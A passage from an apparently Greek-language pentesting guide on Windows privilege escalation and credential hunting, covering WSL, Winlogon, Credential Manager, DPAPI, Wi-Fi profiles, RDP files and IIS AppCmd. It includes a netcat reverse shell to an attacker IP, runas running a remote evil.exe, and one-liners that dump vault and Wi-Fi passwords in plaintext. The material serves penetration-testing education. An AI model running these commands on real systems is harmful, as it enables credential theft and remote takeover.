backend· ένας κανόνας προώθησης από μόνος του δεν αποδεικνύει ότι ο προορισμός είναι προσβάσιμος ή ευάλωτος.

### Πίνακας δρομολόγησης

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Πίνακας ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Κανόνες τείχους προστασίας

[**Δείτε αυτή τη σελίδα για εντολές σχετικές με το τείχος προστασίας**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για απαρίθμηση δικτύου εδώ](../basic-cmd-for-pentesters.md#network)

### Υποσύστημα Windows για Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Το δυαδικό αρχείο `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε χρήστη root, μπορείτε να κάνετε listen σε οποιαδήποτε θύρα (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να κάνετε listen σε μια θύρα, θα εμφανιστεί ένα GUI που θα σας ρωτά αν πρέπει να επιτραπεί στο `nc` να επικοινωνεί μέσω του firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε το `--default-user root`

Μπορείτε να εξερευνήσετε το filesystem του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Το Linux `root` μέσα στο WSL δεν παρέχει από μόνο του δικαιώματα Windows Administrator. Αν η τρέχουσα ταυτότητα Windows μπορεί να διαβάσει το filesystem μιας διανομής, ελέγξτε τα αρχεία ιστορικού του shell (συμπεριλαμβανομένου του `/root/.bash_history`) για εντολές που ενδέχεται να έχουν καταγράψει διαπιστευτήρια· για την κλιμάκωση προνομίων εξακολουθεί να απαιτείται ένας έγκυρος λογαριασμός με υψηλότερα προνόμια και μια επιτρεπόμενη μέθοδος ελέγχου ταυτότητας. Η διάταξη `LocalState\rootfs` αφορά παλαιότερες εγκαταστάσεις WSL· το WSL 2 συνήθως αποθηκεύει τη διανομή σε έναν εικονικό δίσκο [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), οπότε εντοπίστε πρώτα την πραγματική διανομή και τη διαδρομή αποθήκευσής της. Αποφύγετε την εμφάνιση των περιεχομένων του ιστορικού κατά την αυτοματοποιημένη απαρίθμηση.

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Αντιμετωπίστε τα `DefaultUserName` και `DefaultDomainName` ως στοιχεία του λογαριασμού, όχι ως διαπιστευτήρια. Μια μη κενή τιμή `DefaultPassword` ή `AltDefaultPassword` αποτελεί εύρημα plaintext στο registry. Αν το `AutoAdminLogon=1`, αλλά δεν είναι αναγνώσιμος κανένας plaintext κωδικός πρόσβασης, αυτό αποτελεί μόνο ένδειξη: το [Sysinternals Autologon μπορεί να αποθηκεύσει τον κωδικό πρόσβασης ως LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), ενώ οι συνήθεις αναγνώσεις του registry δεν αποδεικνύουν αν υπάρχει αυτό το secret ή αν μπορεί να ανακτηθεί. Ελέγξτε τα δικαιώματα πρόσβασης και την πραγματική διαμόρφωση σύνδεσης πριν αναφέρετε έκθεση διαπιστευτηρίων.

### Διαχειριστής διαπιστευτηρίων / Windows vault

Από το [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για servers, ιστότοπους και άλλα προγράμματα, τα οποία μπορεί να χρησιμοποιήσει το **Windows** για να **συνδέει αυτόματα τους χρήστες**. Αρχικά, μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύουν διαπιστευτήρια για ιστότοπους όπως το Facebook, το Twitter ή το Gmail και να συνδέονται αυτόματα μέσω των browsers, αλλά δεν λειτουργεί έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία τα Windows μπορούν να συνδέουν αυτόματα τους χρήστες. Αυτό σημαίνει ότι κάθε **εφαρμογή Windows που χρειάζεται διαπιστευτήρια για να αποκτήσει πρόσβαση σε έναν πόρο** (server ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** και το Windows Vault, χρησιμοποιώντας τα παρεχόμενα διαπιστευτήρια αντί να πληκτρολογούν οι χρήστες κάθε φορά το username και το password.

Αν οι εφαρμογές δεν αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το credential manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο vault αποθήκευσης.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στον υπολογιστή.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το ακόλουθο παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Χρήση του `runas` με παρεχόμενα διαπιστευτήρια.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Σημειώστε ότι μπορείτε να χρησιμοποιήσετε τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Οι σύγχρονες εφαρμογές Windows UWP, ο Microsoft Edge και οι σύγχρονες υπηρεσίες συστήματος αποθηκεύουν διακριτικά ελέγχου ταυτότητας και κωδικούς πρόσβασης σε απλό κείμενο μέσα στο `PasswordVault` της Universal Windows Platform (UWP) (το οποίο εμφανίζεται επίσης ως `Web Credentials` στο `vaultcmd`). Αυτός ο χώρος αποθήκευσης είναι απομονωμένος ανά περίοδο λειτουργίας και μπορεί να αποκρυπτογραφηθεί εγγενώς, χωρίς δικαιώματα διαχειριστή ή `SeDebugPrivilege`.

Εκτελέστε αυτήν την εντολή PowerShell μέσα στην ενεργή περίοδο λειτουργίας του χρήστη για να κάνετε αμέσως dump και αποκρυπτογράφηση όλων των αποθηκευμένων ονομάτων χρήστη και κωδικών πρόσβασης σε απλό κείμενο:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων και χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ιδιωτικών ασύμμετρων κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος, το οποίο συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που παράγεται από τα μυστικά σύνδεσης του χρήστη**. Σε περιπτώσεις κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας τομέα του συστήματος.

Τα κρυπτογραφημένα κλειδιά RSA χρηστών, μέσω του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Αναγνωριστικό ασφαλείας](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, το οποίο βρίσκεται μαζί με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, αποτελείται συνήθως από 64 byte τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, οπότε δεν είναι δυνατή η εμφάνιση των περιεχομένων του με την εντολή `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτηρίων που προστατεύονται από τον κύριο κωδικό πρόσβασης** βρίσκονται συνήθως στα:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για αποκρυπτογράφηση.\
Μπορείτε να **εξαγάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά για εργασίες **scripting** και αυτοματοποίησης, ως ένας πρακτικός τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων. Τα διαπιστευτήρια προστατεύονται με **DPAPI**, πράγμα που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Ένα εξαγόμενο διαπιστευτήριο μπορεί να έχει αυθαίρετο όνομα αρχείου ή διαδρομή `.xml`. Όταν ένα script ή μια απογραφή αρχείων εντοπίζει κάποιο τέτοιο αρχείο, βρείτε τον πραγματικό κατάλογο προφίλ του λογαριασμού αντί να υποθέσετε ότι βρίσκεται στο `C:\Users`: [Τα Windows μπορούν να τοποθετούν τα προφίλ σε άλλες θέσεις](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Ένα αρχείο που είναι αναγνώσιμο αποτελεί μόνο ένδειξη· [τα Windows `Export-Clixml` συνδέουν ένα κρυπτογραφημένο διαπιστευτήριο με τον χρήστη και τον υπολογιστή που το εξήγαγαν](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), και κάθε λογαριασμός που ανακτάται πρέπει ξεχωριστά να έχει έγκυρα δικαιώματα στην προβλεπόμενη υπηρεσία. Ελέγξτε πρώτα τις διαδρομές και τα ACL, χωρίς να εμφανίζετε κρυπτογραφημένες ή απλού κειμένου τιμές κατά τη συνήθη απογραφή.

Για να **αποκρυπτογραφήσετε** διαπιστευτήρια PS από το αρχείο που τα περιέχει, μπορείτε να κάνετε τα εξής:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Εντολές που εκτελέστηκαν πρόσφατα

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Διαχειριστής διαπιστευτηρίων Απομακρυσμένης επιφάνειας εργασίας**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε τυχόν αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

**Το mRemoteNG χρησιμοποιεί διαφορετικό χώρο αποθήκευσης συνδέσεων.** Ελέγξτε τα αναγνώσιμα XML στα `%APPDATA%\mRemoteNG` και στους φακέλους Documents των χρηστών, συμπεριλαμβανομένων αρχείων με συνηθισμένα ονόματα, όπως `config.xml`. Εντοπίστε το σχήμα των συνδέσεων και τα κρυπτογραφημένα attributes `Password` προτού θεωρήσετε ένα αρχείο XML πιθανό εύρημα διαπιστευτηρίων. Η αποθηκευμένη τιμή δεν είναι κωδικός πρόσβασης DPAPI/RDCMan· η ανάκτηση εξαρτάται από τις ρυθμίσεις κρυπτογράφησης του αρχείου και από το αν χρησιμοποιήθηκε προσαρμοσμένος κύριος κωδικός πρόσβασης. Αποφύγετε να εμφανίζετε κρυπτογραφημένες τιμές κατά τη μαζική αναζήτηση.

**Οι εξαγωγές προφίλ του Remote Desktop Plus** μπορεί επίσης να είναι αναγνώσιμες σε καταλόγους χρηστών ή σε κοινόχρηστο φάκελο διαχείρισης. Μια παλαιότερη εξαγωγή `profiles.xml` έχει εγγραφές `Data/Profile` με στοιχεία `ProfileName`, `Password` και `Secure`. Αντιμετωπίστε ένα μη κενό στοιχείο password ως πιθανό εύρημα διαπιστευτηρίων, χωρίς να το εμφανίσετε ή να θεωρήσετε ότι είναι σε απλό κείμενο: [ο προμηθευτής σημειώνει](https://www.donkz.nl/) ότι η προστασία προφίλ μπορεί να συνδέεται με τον λογαριασμό και τον υπολογιστή δημιουργίας ή να έχει ρυθμιστεί με λιγότερο αυστηρό τρόπο. Επιβεβαιώστε την προέλευση του αρχείου και τις προϋποθέσεις ανάκτησης πριν βασιστείτε σε αυτό.

### Sticky Notes

Μερικές φορές οι χρήστες αποθηκεύουν κωδικούς πρόσβασης και άλλες πληροφορίες σε εφαρμογές αυτοκόλλητων σημειώσεων. Η packaged εφαρμογή Sticky Notes της Microsoft αποθηκεύει συνήθως τις σημειώσεις στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`· παλαιότερες ή διαφορετικές εφαρμογές μπορεί να χρησιμοποιούν άλλους χώρους αποθήκευσης στο προφίλ χρήστη, όπως το LevelDB. Εντοπίστε την εγκατεστημένη εφαρμογή και τη μορφή αποθήκευσης προτού θεωρήσετε ότι η απουσία αρχείου SQLite σημαίνει πως δεν υπάρχουν σημειώσεις.

Αν το Sticky Notes χρησιμοποιεί καταγραφή write-ahead σε SQLite, ένα αντίγραφο μόνο του `plum.sqlite` μπορεί να παραλείπει πρόσφατες δεσμευμένες σημειώσεις. Διατηρήστε το αντίστοιχο `plum.sqlite-wal` μαζί με ένα συνεπές αντίγραφο της βάσης δεδομένων και συμπεριλάβετε το `plum.sqlite-shm` όταν είναι διαθέσιμο· ο δείκτης κοινόχρηστης μνήμης μπορεί να αναδημιουργηθεί, αλλά το WAL αποτελεί μέρος της μόνιμης κατάστασης της βάσης δεδομένων. Δείτε την [τεκμηρίωση WAL του SQLite](https://www.sqlite.org/wal.html). Μια σημείωση που περιέχει όνομα λογαριασμού ή κωδικό πρόσβασης αποτελεί μόνο πιθανό εύρημα διαπιστευτηρίων: επαληθεύστε ξεχωριστά τον λογαριασμό, τα επιτρεπόμενα δικαιώματα πρόσβασης και την επαναχρησιμοποίηση του κωδικού πρόσβασης. Μια κρυπτογραφημένη εγγραφή password manager απαιτεί επίσης το πραγματικό κλειδί αποκρυπτογράφησης και ερμηνεία ειδική για την εφαρμογή, προτού μπορέσει να τεκμηριώσει σύνδεση με υψηλότερα δικαιώματα.

### AppCmd.exe

**Σημειώστε ότι για την ανάκτηση κωδικών πρόσβασης από το AppCmd.exe πρέπει να είστε Administrator και να εκτελέσετε το εργαλείο με επίπεδο High Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν υπάρχει αυτό το αρχείο, είναι πιθανό να έχουν ρυθμιστεί κάποια **διαπιστευτήρια** και να μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe`.\
Τα προγράμματα εγκατάστασης **εκτελούνται με δικαιώματα SYSTEM**, πολλά είναι ευάλωτα σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Αρχεία και Registry (Διαπιστευτήρια)

### Τεχνουργήματα διαπιστευτηρίων στο Registry εργαλείων υποστήριξης

Ορισμένες παλαιότερες εγκαταστάσεις απομακρυσμένης υποστήριξης διατηρούν ονόματα τιμών σχετικών με κωδικούς πρόσβασης κάτω από σταθερά κλειδιά Registry της εφαρμογής. Για παράδειγμα, το `SecurityPasswordAES` του TeamViewer προσδιόριζε έναν διαμορφωμένο στατικό κωδικό πρόσβασης συνεδρίας σε εκδόσεις πριν από την 9, σύμφωνα με την [εξήγηση του προμηθευτή για το κλειδί Registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Ένας δείκτης ονόματος τιμής αποτελεί μόνο ένα στοιχείο προς διερεύνηση: επαληθεύστε την εγκατεστημένη έκδοση, τα αναγνώσιμα δεδομένα τιμής, τη μορφή και την τρέχουσα συμπεριφορά ελέγχου ταυτότητας πριν αξιολογήσετε αυτό το διαπιστευτήριο. Η μετάβαση από έναν κωδικό πρόσβασης απομακρυσμένης υποστήριξης σε έναν λογαριασμό Windows με περισσότερα προνόμια απαιτεί επίσης πραγματική επαναχρησιμοποίηση του κωδικού πρόσβασης και εξουσιοδότηση για αυτόν τον λογαριασμό. Μην εμφανίζετε κρυπτοκείμενο ή ανακτημένους κωδικούς πρόσβασης στα συνήθη αποτελέσματα απαρίθμησης.

### Κοινόχρηστα υπολογιστικά φύλλα με προστατευμένα φύλλα

Αν υπάρχει υποψία ότι ένα αναγνώσιμο κοινόχρηστο βιβλίο εργασίας περιέχει δεδομένα λογαριασμών, διακρίνετε την **κρυπτογράφηση αρχείου** από την προστασία φύλλου εργασίας ή τις κρυφές στήλες. Η [Microsoft αναφέρει](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) ότι η προστασία φύλλου εργασίας ελέγχει την επεξεργασία και δεν αποτελεί χαρακτηριστικό ασφαλείας· από μόνη της δεν τεκμηριώνει ότι τα περιεχόμενα του βιβλίου εργασίας είναι κρυπτογραφημένα. Εξετάζετε μόνο εξουσιοδοτημένα, σχετικά αρχεία και αποφύγετε την εμφάνιση πιθανών μυστικών κατά την ευρεία απαρίθμηση. Μια αναγνώσιμη διαδρομή `.xlsx`, ένα προστατευμένο φύλλο ή μια κρυφή στήλη από μόνα τους δεν αποδεικνύουν ότι υπάρχουν διαπιστευτήρια ή ότι κάποιος λογαριασμός έχει περισσότερα προνόμια· επαληθεύστε ξεχωριστά τα πραγματικά δεδομένα και τα τρέχοντα δικαιώματα του λογαριασμού.

### Διατηρημένα patches αλλαγών σε CI server

Ένας CI server μπορεί να διατηρεί τις υποβληθείσες αλλαγές πηγαίου κώδικα στον κατάλογο δεδομένων του, ακόμη και μετά την ολοκλήρωση της έκδοσης. Το [TeamCity τεκμηριώνει](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) το `system/changes` ως χώρο αποθήκευσης αλλαγών remote-run· ο κατάλογος δεδομένων μπορεί να ρυθμιστεί και δεν βρίσκεται απαραίτητα στο `ProgramData`. Ένα αναγνώσιμο patch μπορεί να διατηρήσει αφαιρεμένες ή προστιθέμενες αναφορές σε αρχείο διαπιστευτηρίων, κλειδί κρυπτογράφησης ή script που χρησιμοποιεί και τα δύο. Για παράδειγμα, μια ροή εργασιών PowerShell `ConvertTo-SecureString -Key` χρειάζεται το κλειδί AES καθώς και την κρυπτογραφημένη συμβολοσειρά· η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) ότι το κλειδί παρέχεται ξεχωριστά. Εξετάστε πρώτα μόνο τα προσβάσιμα ονόματα patch και, στη συνέχεια, επιθεωρήστε το σχετικό περιεχόμενο με εξουσιοδότηση, χωρίς να εμφανίζετε μυστικά στα συνήθη αποτελέσματα απαρίθμησης. Μια διαδρομή patch, μια κρυπτογραφημένη τιμή ή μια αναφορά σε κλειδί από μόνα τους δεν αποδεικνύουν την ύπαρξη έγκυρου διαπιστευτηρίου ή πρόσβασης με περισσότερα προνόμια. Περιορίστε τα ACL του καταλόγου δεδομένων και αποφύγετε την αποθήκευση μυστικών στις αλλαγές του build.

### Προσαρμοσμένη περιστροφή κωδικού πρόσβασης τοπικού διαχειριστή

Ένας ιδιοκατασκευασμένος μηχανισμός περιστροφής κωδικών πρόσβασης μπορεί να αποθηκεύει κρυπτογραφημένο κωδικό πρόσβασης τοπικού διαχειριστή σε μια τοπική υπηρεσία, ενώ διατηρεί τα διαπιστευτήρια του datastore σε αναγνώσιμο αρχείο `.env` ή δίπλα στο εκτελέσιμο αρχείο του updater. Εξετάστε από κοινού την προγραμματισμένη εργασία του updater, τον λογαριασμό, τα ACL της διαμόρφωσης, τον listener και τα δικαιώματα του datastore. Ένα datastore που δέχεται συνδέσεις μόνο μέσω loopback εξακολουθεί να είναι προσβάσιμο σε τοπικό χρήστη με έγκυρα διαπιστευτήρια, αλλά ο έλεγχος ταυτότητας από μόνος του δεν αποδεικνύει δικαίωμα ανάγνωσης των σχετικών εγγραφών. Αν το seed κρυπτογράφησης ή το υλικό κλειδιού είναι προσβάσιμο δίπλα στο κρυπτοκείμενο, εξετάστε την ακριβή παραγωγή κλειδιού πριν εμπιστευτείτε την κρυπτογράφηση. Ένα σχήμα που παράγει ντετερμινιστικά ένα κλειδί AES από εκτεθειμένο seed μέσω της Go [`math/rand`](https://pkg.go.dev/math/rand) είναι ακατάλληλο για την προστασία αυτού του κωδικού πρόσβασης· η Go τεκμηριώνει ότι αυτό το πακέτο δεν είναι κατάλληλο για τυχαιότητα ευαίσθητη ως προς την ασφάλεια. Επιβεβαιώστε ότι οποιοσδήποτε ανακτημένος κωδικός πρόσβασης είναι τρέχων και ανήκει σε λογαριασμό της ομάδας τοπικών Administrators πριν τον θεωρήσετε διαδρομή κλιμάκωσης προνομίων. Μια προγραμματισμένη εργασία, μια διαδρομή `.env` ή ένα κρυπτογραφημένο blob από μόνα τους δεν αποδεικνύουν καμία από αυτές τις προϋποθέσεις. Μην εμφανίζετε κωδικούς πρόσβασης και υλικό κλειδιού στα συνήθη αποτελέσματα απαρίθμησης.

Χρησιμοποιήστε το [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) για τη διαχείριση κωδικών πρόσβασης τοπικών διαχειριστών. Η αποθήκευσή του σε directory ή μέσω Entra και οι έλεγχοι πρόσβασης διαφέρουν από ένα προσαρμοσμένο τοπικό datastore· αντίστοιχα, οι [ρόλοι Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) καθορίζουν αν ένας χρήστης datastore που έχει ελεγχθεί η ταυτότητά του μπορεί να διαβάσει ένα συγκεκριμένο index.

### Αρχεία plugin Java server και επαναχρησιμοποίηση διαπιστευτηρίων

Ορισμένα plugins Java server διανέμονται ως αρχεία JAR στον κατάλογο `plugins` ενός server. Ένα αναγνώσιμο προσαρμοσμένο plugin μπορεί να περιέχει ρυθμίσεις ή bytecode με ενσωματωμένο διαπιστευτήριο υπηρεσίας. Εξετάστε το αρχείο μόνο με εξουσιοδότηση και μην εμφανίζετε ανακτημένα μυστικά στα συνήθη αποτελέσματα απαρίθμησης. Μια διαδρομή plugin από μόνη της δεν αποδεικνύει την ύπαρξη μυστικού και ένας ανακτημένος κωδικός πρόσβασης υπηρεσίας οδηγεί σε περισσότερα προνόμια μόνο αν ισχύει επίσης για λογαριασμό με περισσότερα προνόμια. Ελέγξτε τα ACL των σχετικών αρχείων και αντικαταστήστε τα επαναχρησιμοποιημένα διαπιστευτήρια με ξεχωριστά μυστικά. Δείτε τον [οδηγό εγκατάστασης plugin του PaperMC](https://docs.papermc.io/paper/adding-plugins/) για τη διάταξη των καταλόγων και την [τεκμηρίωση JAR της Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) για τα περιεχόμενα αρχείων.

### Διαπιστευτήρια ενσωματωμένης βάσης δεδομένων Openfire

